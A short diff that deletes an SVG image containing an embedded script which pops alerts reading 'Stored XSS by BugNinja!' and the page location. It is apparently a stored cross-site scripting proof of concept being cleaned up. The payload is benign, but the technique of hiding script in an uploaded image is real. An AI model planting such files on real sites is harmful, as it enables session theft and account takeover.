@@ -1,7 +1,0 @@
-<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500">
-    <script>//<![CDATA[
-        alert("Stored XSS by BugNinja!");
-		alert(window.location);
-    //]]>
-    </script>
-</svg>
